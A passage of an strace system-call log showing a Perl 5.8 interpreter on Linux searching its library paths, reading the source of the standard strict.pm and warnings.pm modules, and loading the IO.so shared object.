6692  07:15:04.950781 stat64("/usr/lib/perl/5.8/strict.pmc", 0xbfe78f1c) = -1 ENOENT (No such file or directory)
6692  07:15:04.950793 stat64("/usr/lib/perl/5.8/strict.pm", 0xbfe78e2c) = -1 ENOENT (No such file or directory)
6692  07:15:04.950807 stat64("/usr/share/perl/5.8/strict.pmc", 0xbfe78f1c) = -1 ENOENT (No such file or directory)
6692  07:15:04.950823 stat64("/usr/share/perl/5.8/strict.pm", {st_mode=S_IFREG|0644, st_size=599, ...}) = 0
6692  07:15:04.950843 open("/usr/share/perl/5.8/strict.pm", O_RDONLY|O_LARGEFILE) = 8
6692  07:15:04.950858 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfe78c38) = -1 ENOTTY (Inappropriate ioctl for device)
6692  07:15:04.950869 _llseek(8, 0, [0], SEEK_CUR) = 0
6692  07:15:04.950888 read(8, "package strict;\n\n$strict::VERSION = \"1.03\";\n\nmy %bitmask = (\nrefs => 0x00000002,\nsubs => 0x00000200,\nvars => 0x00000400\n);\n\nsub bits {\n    my $bits = 0;\n    my @wrong;\n    foreach my $s (@_) {\n\tpush @wrong, $s unless exists $bitmask{$s};\n        $bits |= $bitmask{$s} || 0;\n    }\n    if (@wrong) {\n        require Carp;\n        Carp::croak(\"Unknown \'strict\' tag(s) \'@wrong\'\");\n    }\n    $bits;\n}\n\nmy $default_bits = bits(qw(refs subs vars));\n\nsub import {\n    shift;\n    $^H |= @_ ? bits(@_) : $default_bits;\n}\n\nsub unimport {\n    shift;\n    $^H &= ~ (@_ ? bits(@_) : $default_bits);\n}\n\n1;\n__END__\n\n", 4096) = 599
6692  07:15:04.951107 _llseek(8, 598, [598], SEEK_SET) = 0
6692  07:15:04.951150 _llseek(8, 0, [598], SEEK_CUR) = 0
6692  07:15:04.951160 close(8)          = 0
6692  07:15:04.951198 stat64("/etc/perl/warnings.pmc", 0xbfe78f1c) = -1 ENOENT (No such file or directory)
6692  07:15:04.951213 stat64("/etc/perl/warnings.pm", 0xbfe78e2c) = -1 ENOENT (No such file or directory)
6692  07:15:04.951227 stat64("/usr/local/lib/perl/5.8.8/warnings.pmc", 0xbfe78f1c) = -1 ENOENT (No such file or directory)
6692  07:15:04.951239 stat64("/usr/local/lib/perl/5.8.8/warnings.pm", 0xbfe78e2c) = -1 ENOENT (No such file or directory)
6692  07:15:04.951253 stat64("/usr/local/share/perl/5.8.8/warnings.pmc", 0xbfe78f1c) = -1 ENOENT (No such file or directory)
6692  07:15:04.951266 stat64("/usr/local/share/perl/5.8.8/warnings.pm", 0xbfe78e2c) = -1 ENOENT (No such file or directory)
6692  07:15:04.951279 stat64("/usr/lib/perl5/warnings.pmc", 0xbfe78f1c) = -1 ENOENT (No such file or directory)
6692  07:15:04.951291 stat64("/usr/lib/perl5/warnings.pm", 0xbfe78e2c) = -1 ENOENT (No such file or directory)
6692  07:15:04.951304 stat64("/usr/share/perl5/warnings.pmc", 0xbfe78f1c) = -1 ENOENT (No such file or directory)
6692  07:15:04.951316 stat64("/usr/share/perl5/warnings.pm", 0xbfe78e2c) = -1 ENOENT (No such file or directory)
6692  07:15:04.951329 stat64("/usr/lib/perl/5.8/warnings.pmc", 0xbfe78f1c) = -1 ENOENT (No such file or directory)
6692  07:15:04.951341 stat64("/usr/lib/perl/5.8/warnings.pm", 0xbfe78e2c) = -1 ENOENT (No such file or directory)
6692  07:15:04.951355 stat64("/usr/share/perl/5.8/warnings.pmc", 0xbfe78f1c) = -1 ENOENT (No such file or directory)
6692  07:15:04.951367 stat64("/usr/share/perl/5.8/warnings.pm", {st_mode=S_IFREG|0644, st_size=13018, ...}) = 0
6692  07:15:04.951388 open("/usr/share/perl/5.8/warnings.pm", O_RDONLY|O_LARGEFILE) = 8
6692  07:15:04.951402 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfe78c38) = -1 ENOTTY (Inappropriate ioctl for device)
6692  07:15:04.951413 _llseek(8, 0, [0], SEEK_CUR) = 0
6692  07:15:04.951431 read(8, "# -*- buffer-read-only: t -*-\n# !!!!!!!   DO NOT EDIT THIS FILE   !!!!!!!\n# This file was created by warnings.pl\n# Any changes made here will be lost.\n#\n\npackage warnings;\n\nour $VERSION = \'1.05\';\n\nuse Carp ();\n\nour %Offsets = (\n\n    # Warnings Categories added in Perl 5.008\n\n    \'all\'\t\t=> 0,\n    \'closure\'\t\t=> 2,\n    \'deprecated\'\t=> 4,\n    \'exiting\'\t\t=> 6,\n    \'glob\'\t\t=> 8,\n    \'io\'\t\t=> 10,\n    \'closed\'\t\t=> 12,\n    \'exec\'\t\t=> 14,\n    \'layer\'\t\t=> 16,\n    \'newline\'\t\t=> 18,\n    \'pipe\'\t\t=> 20,\n    \'unopened\'\t\t=> 22,\n    \'misc\'\t\t=> 24,\n    \'numeric\'\t\t=> 26,\n    \'once\'\t\t=> 28,\n    \'overflow\'\t\t=> 30,\n    \'pack\'\t\t=> 32,\n    \'portable\'\t\t=> 34,\n    \'recursion\'\t\t=> 36,\n    \'redefine\'\t\t=> 38,\n    \'regexp\'\t\t=> 40,\n    \'severe\'\t\t=> 42,\n    \'debugging\'\t\t=> 44,\n    \'inplace\'\t\t=> 46,\n    \'internal\'\t\t=> 48,\n    \'malloc\'\t\t=> 50,\n    \'signal\'\t\t=> 52,\n    \'substr\'\t\t=> 54,\n    \'syntax\'\t\t=> 56,\n    \'ambiguous\'\t\t=> 58,\n    \'bareword\'\t\t=> 60,\n    \'digit\'\t\t=> 62,\n    \'parenthesis\'\t=> 64,\n    \'precedence\'\t=> 66,\n    \'printf\'\t\t=> 68,\n    \'prototype\'\t\t=> 70,\n    \'qw\'\t\t=> 72,\n    \'reserved\'\t\t=> 74,\n    \'semicolon\'\t\t=> 76,\n    \'taint\'\t\t=> 78,\n    \'threads\'\t\t=> 80,\n    \'uninitialized\'\t=> 82,\n    \'unpack\'\t\t=> 84,\n    \'untie\'\t\t=> 86,\n    \'utf8\'\t\t=> 88,\n    \'void\'\t\t=> 90,\n    \'y2k\'\t\t=> 92,\n  );\n\nour %Bits = (\n    \'all\'\t\t=> \"\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x15\", # [0..46]\n    \'ambiguous\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\", # [29]\n    \'bareword\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\", # [30]\n    \'closed\'\t\t=> \"\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [6]\n    \'closure\'\t\t=> \"\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [1]\n    \'debugging\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\", # [22]\n    \'deprecated\'\t=> \"\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [2]\n    \'digit\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\", # [31]\n    \'exec\'\t\t=> \"\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [7]\n    \'exiting\'\t\t=> \"\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [3]\n    \'glob\'\t\t=> \"\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [4]\n    \'inplace\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\", # [23]\n    \'internal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\", # [24]\n    \'io\'\t\t=> \"\\x00\\x54\\x55\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [5..11]\n    \'layer\'\t\t=> \"\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [8]\n    \'malloc\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\", # [25]\n    \'misc\'\t\t=> \"\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [12]\n    \'newline\'\t\t=> \"\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [9]\n    \'numeric\'\t\t=> \"\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [13]\n    \'once\'\t\t=> \"\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [14]\n    \'overflow\'\t\t=> \"\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [15]\n    \'pack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [16]\n    \'parenthesis\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\", # [32]\n    \'pipe\'\t\t=> \"\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [10]\n    \'portable\'\t\t=> \"\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [17]\n    \'precedence\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\", # [33]\n    \'printf\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\", # [34]\n    \'prototype\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\", # [35]\n    \'qw\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\", # [36]\n    \'recursion\'\t\t=> \"\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [18]\n    \'redefine\'\t\t=> \"\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [19]\n    \'regexp\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\", # [20]\n    \'reserved\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\", # [37]\n    \'semicolon\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\", # [38]\n    \'severe\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x54\\x05\\x00\\x00\\x00\\x00\\x00\", # [21..25]\n    \'signal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\", # [26]\n    \'substr\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x40", 4096) = 4096
6692  07:15:04.951893 brk(0x81b6000)    = 0x81b6000
6692  07:15:04.951910 brk(0x81b5000)    = 0x81b5000
6692  07:15:04.952006 read(8, "\\x00\\x00\\x00\\x00\\x00\", # [27]\n    \'syntax\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x55\\x55\\x15\\x00\\x00\", # [28..38]\n    \'taint\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\", # [39]\n    \'threads\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\", # [40]\n    \'uninitialized\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\", # [41]\n    \'unopened\'\t\t=> \"\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [11]\n    \'unpack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\", # [42]\n    \'untie\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\", # [43]\n    \'utf8\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\", # [44]\n    \'void\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\", # [45]\n    \'y2k\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\", # [46]\n  );\n\nour %DeadBits = (\n    \'all\'\t\t=> \"\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\x2a\", # [0..46]\n    \'ambiguous\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\", # [29]\n    \'bareword\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\", # [30]\n    \'closed\'\t\t=> \"\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [6]\n    \'closure\'\t\t=> \"\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [1]\n    \'debugging\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\", # [22]\n    \'deprecated\'\t=> \"\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [2]\n    \'digit\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\", # [31]\n    \'exec\'\t\t=> \"\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [7]\n    \'exiting\'\t\t=> \"\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [3]\n    \'glob\'\t\t=> \"\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [4]\n    \'inplace\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\", # [23]\n    \'internal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\", # [24]\n    \'io\'\t\t=> \"\\x00\\xa8\\xaa\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [5..11]\n    \'layer\'\t\t=> \"\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [8]\n    \'malloc\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\", # [25]\n    \'misc\'\t\t=> \"\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [12]\n    \'newline\'\t\t=> \"\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [9]\n    \'numeric\'\t\t=> \"\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [13]\n    \'once\'\t\t=> \"\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [14]\n    \'overflow\'\t\t=> \"\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [15]\n    \'pack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [16]\n    \'parenthesis\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\", # [32]\n    \'pipe\'\t\t=> \"\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [10]\n    \'portable\'\t\t=> \"\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [17]\n    \'precedence\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\", # [33]\n    \'printf\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\", # [34]\n    \'prototype\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\", # [35]\n    \'qw\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\", # [36]\n    \'recursion\'\t\t=> \"\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [18]\n    \'redefine\'\t\t=> \"\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [19]\n    \'regexp\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\", # [20]\n    \'reserved\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\", # [37]\n    \'semicolon\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\", # [38]\n    \'severe\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\xa8\\x0a\\x00\\x00\\x00\\x00\\x00\", # [21..25]\n    \'signal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\", # [26]\n    \'substr\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\", # [27]\n    \'syntax\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xaa\\xaa\\x2a\\x00\\x00\", # [28..38]\n    \'taint\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\", # [39]\n    \'threads\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\", # [40]\n    \'uninitialized\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\", # [41]\n    \'unopened\'\t\t=> \"\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [11]\n    \'unpack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\", 4096) = 4096
6692  07:15:04.952594 read(8, "x00\\x20\\x00\", # [42]\n    \'untie\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\", # [43]\n    \'utf8\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\", # [44]\n    \'void\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\", # [45]\n    \'y2k\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\", # [46]\n  );\n\n$NONE     = \"\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\";\n$LAST_BIT = 94 ;\n$BYTES    = 12 ;\n\n$All = \"\" ; vec($All, $Offsets{\'all\'}, 2) = 3 ;\n\nsub Croaker\n{\n    local $Carp::CarpInternal{\'warnings\'};\n    delete $Carp::CarpInternal{\'warnings\'};\n    Carp::croak(@_);\n}\n\nsub bits\n{\n    # called from B::Deparse.pm\n\n    push @_, \'all\' unless @_;\n\n    my $mask;\n    my $catmask ;\n    my $fatal = 0 ;\n    my $no_fatal = 0 ;\n\n    foreach my $word ( @_ ) {\n\tif ($word eq \'FATAL\') {\n\t    $fatal = 1;\n\t    $no_fatal = 0;\n\t}\n\telsif ($word eq \'NONFATAL\') {\n\t    $fatal = 0;\n\t    $no_fatal = 1;\n\t}\n\telsif ($catmask = $Bits{$word}) {\n\t    $mask |= $catmask ;\n\t    $mask |= $DeadBits{$word} if $fatal ;\n\t    $mask &= ~($DeadBits{$word}|$All) if $no_fatal ;\n\t}\n\telse\n          { Croaker(\"Unknown warnings category \'$word\'\")}\n    }\n\n    return $mask ;\n}\n\nsub import \n{\n    shift;\n\n    my $catmask ;\n    my $fatal = 0 ;\n    my $no_fatal = 0 ;\n\n    my $mask = ${^WARNING_BITS} ;\n\n    if (vec($mask, $Offsets{\'all\'}, 1)) {\n        $mask |= $Bits{\'all\'} ;\n        $mask |= $DeadBits{\'all\'} if vec($mask, $Offsets{\'all\'}+1, 1);\n    }\n    \n    push @_, \'all\' unless @_;\n\n    foreach my $word ( @_ ) {\n\tif ($word eq \'FATAL\') {\n\t    $fatal = 1;\n\t    $no_fatal = 0;\n\t}\n\telsif ($word eq \'NONFATAL\') {\n\t    $fatal = 0;\n\t    $no_fatal = 1;\n\t}\n\telsif ($catmask = $Bits{$word}) {\n\t    $mask |= $catmask ;\n\t    $mask |= $DeadBits{$word} if $fatal ;\n\t    $mask &= ~($DeadBits{$word}|$All) if $no_fatal ;\n\t}\n\telse\n          { Croaker(\"Unknown warnings category \'$word\'\")}\n    }\n\n    ${^WARNING_BITS} = $mask ;\n}\n\nsub unimport \n{\n    shift;\n\n    my $catmask ;\n    my $mask = ${^WARNING_BITS} ;\n\n    if (vec($mask, $Offsets{\'all\'}, 1)) {\n        $mask |= $Bits{\'all\'} ;\n        $mask |= $DeadBits{\'all\'} if vec($mask, $Offsets{\'all\'}+1, 1);\n    }\n\n    push @_, \'all\' unless @_;\n\n    foreach my $word ( @_ ) {\n\tif ($word eq \'FATAL\') {\n\t    next; \n\t}\n\telsif ($catmask = $Bits{$word}) {\n\t    $mask &= ~($catmask | $DeadBits{$word} | $All);\n\t}\n\telse\n          { Croaker(\"Unknown warnings category \'$word\'\")}\n    }\n\n    ${^WARNING_BITS} = $mask ;\n}\n\nmy %builtin_type; @builtin_type{qw(SCALAR ARRAY HASH CODE REF GLOB LVALUE Regexp)} = ();\n\nsub __chk\n{\n    my $category ;\n    my $offset ;\n    my $isobj = 0 ;\n\n    if (@_) {\n        # check the category supplied.\n        $category = shift ;\n        if (my $type = ref $category) {\n            Croaker(\"not an object\")\n                if exists $builtin_type{$type};\n\t    $category = $type;\n            $isobj = 1 ;\n        }\n        $offset = $Offsets{$category};\n        Croaker(\"Unknown warnings category \'$category\'\")\n\t    unless defined $offset;\n    }\n    else {\n        $category = (caller(1))[0] ;\n        $offset = $Offsets{$category};\n        Croaker(\"package \'$category\' not registered for warnings\")\n\t    unless defined $offset ;\n    }\n\n    my $this_pkg = (caller(1))[0] ;\n    my $i = 2 ;\n    my $pkg ;\n\n    if ($isobj) {\n        while (do { { package DB; $pkg = (caller($i++))[0] } } ) {\n            last unless @DB::args && $DB::args[0] =~ /^$category=/ ;\n        }\n\t$i -= 2 ;\n    }\n    else {\n        for ($i = 2 ; $pkg = (caller($i))[0] ; ++ $i) {\n            last if $pkg ne $this_pkg ;\n        }\n        $i = 2\n            if !$pkg || $pkg eq $this_pkg ;\n    }\n\n    my $callers_bitmask = (caller($i))[9] ;\n    return ($callers_bitmask, $offset, $i) ;\n}\n\nsub enabled\n{\n    Croaker(\"Usage: warnings::enabled([category])\")\n\tunless @_ == 1 || @_ == 0 ;\n\n    my ($callers_bitmask, $offset, $i) = __chk(@_) ;\n\n    return 0 unless defined $callers_bitmask ;\n    return vec($callers_bitmask, $offset, 1) ||\n           vec($callers_bitmask, $Offsets{\'all\'}, 1) ;\n}\n\nsub warn\n{\n    Croaker(\"Usage: warnings::warn([category,] \'message\')\")\n\tunless @_ == 2 || @_ == 1 ;\n\n    my $me", 4096) = 4096
6692  07:15:04.953367 read(8, "ssage = pop ;\n    my ($callers_bitmask, $offset, $i) = __chk(@_) ;\n    Carp::croak($message)\n\tif vec($callers_bitmask, $offset+1, 1) ||\n\t   vec($callers_bitmask, $Offsets{\'all\'}+1, 1) ;\n    Carp::carp($message) ;\n}\n\nsub warnif\n{\n    Croaker(\"Usage: warnings::warnif([category,] \'message\')\")\n\tunless @_ == 2 || @_ == 1 ;\n\n    my $message = pop ;\n    my ($callers_bitmask, $offset, $i) = __chk(@_) ;\n\n    return\n        unless defined $callers_bitmask &&\n            \t(vec($callers_bitmask, $offset, 1) ||\n            \tvec($callers_bitmask, $Offsets{\'all\'}, 1)) ;\n\n    Carp::croak($message)\n\tif vec($callers_bitmask, $offset+1, 1) ||\n\t   vec($callers_bitmask, $Offsets{\'all\'}+1, 1) ;\n\n    Carp::carp($message) ;\n}\n\n1;\n# ex: set ro:\n", 4096) = 730
6692  07:15:04.953544 read(8, "", 4096) = 0
6692  07:15:04.953573 close(8)          = 0
6692  07:15:04.953737 _llseek(6, 412, [412], SEEK_SET) = 0
6692  07:15:04.953753 _llseek(6, 0, [412], SEEK_CUR) = 0
6692  07:15:04.953763 close(6)          = 0
6692  07:15:04.953804 stat64("/usr/lib/perl/5.8/auto/IO/IO.so", {st_mode=S_IFREG|0644, st_size=15580, ...}) = 0
6692  07:15:04.953827 stat64("/usr/lib/perl/5.8/auto/IO/IO.bs", {st_mode=S_IFREG|0644, st_size=0, ...}) = 0
6692  07:15:04.953856 futex(0xb7fd6070, 0x81 /* FUTEX_??? */, 2147483647) = 0
6692  07:15:04.953872 open("/usr/lib/perl/5.8/auto/IO/IO.so", O_RDONLY) = 6
6692  07:15:04.953886 read(6, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0000\22\0\0004\0\0\0\0349\0\0\0\0\0\0004\0 \0\4\0(\0\30\0\27\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\2006\0\0\2006\0\0\5\0\0\0\0\20\0\0\1\0\0\0\2006\0\0\200F\0\0\200F\0\0\360\1\0\0\364\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\2246\0\0\224F\0\0\224F\0\0\310\0\0\0\310\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0C\0\0\0E\0\0\0\0\0\0\0\t\0\0\0\3\0\0\0D\0\0\0\"\0\0\0009\0\0\0\0\0\0\0#\0\0\0\0\0\0\0%\0\0\0:\0\0\0\4\0\0\0001\0\0\0\37\0\0\0;\0\0\0\30\0\0\0+\0\0\0\23\0\0\0\n\0\0\0000\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\16\0\0\0\0\0\0\0004\0\0\0\0\0\0\0\0\0\0\0008\0\0\0\32\0\0\0\0\0\0\0\0\0\0\0?\0\0\0)\0\0\0\10\0\0\0.\0\0\0\26\0\0\0!\0\0\0\21\0\0\0(\0\0\0&\0\0\0-\0\0\0\0\0\0\0\0\0\0\0/\0\0\0\0\0\0\0\0\0\0\0$\0\0\0006\0\0\0\24\0\0\0A\0\0\0\0\0\0\0\27\0\0\0@\0\0\0\0\0\0\0\5\0\0\0\0\0\0\0\0\0\0\0\33\0\0\0\17\0\0\0002\0\0\0\22\0\0\0>\0\0\0\'\0\0\0\36\0\0\0*\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0007\0\0\0\0\0\0\0\7\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
6692  07:15:04.954058 fstat64(6, {st_mode=S_IFREG|0644, st_size=15580, ...}) = 0
6692  07:15:04.954099 mmap2(NULL, 18548, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 6, 0) = 0xb7fda000
6692  07:15:04.954126 mmap2(0xb7fde000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 6, 0x3) = 0xb7fde000
6692  07:15:04.954140 close(6)          = 0
6692  07:15:04.954267 stat64("/etc/perl/IO/Handle.pmc", 0xbfe793cc) = -1 ENOENT (No such file or directory)
6692  07:15:04.954283 stat64("/etc/perl/IO/Handle.pm", 0xbfe792dc) = -1 ENOENT (No such file or directory)
6692  07:15:04.954298 stat64("/usr/local/lib/perl/5.8.8/IO/Handle.pmc", 0xbfe793cc) = -1 ENOENT (No such file or directory)
6692  07:15:04.954310 stat64("/usr/local/lib/perl/5.8.8/IO/Handle.pm", 0xbfe792dc) = -1 ENOENT (No such file or directory)
6692  07:15:04.954325 stat64("/usr/local/share/perl/5.8.8/IO/Handle.pmc", 0xbfe793cc) = -1 ENOENT (No such file or directory)
6692  07:15:04.954338 stat64("/usr/local/share/perl/5.8.8/IO/Handle.pm", 0xbfe792dc) = -1 ENOENT (No such file or directory)
6692  07:15:04.954352 stat64("/usr/lib/perl5/IO/Handle.pmc", 0xbfe793cc) = -1 ENOENT (No such file or directory)
6692  07:15:04.954364 stat64("/usr/lib/perl5/IO/Handle.pm", 0xbfe792dc) = -1 ENOENT (No such file or directory)
6692  07:15:04.954377 stat64("/usr/share/perl5/IO/Handle.pmc", 0xbfe793cc) = -1 ENOENT (No such file or directory)
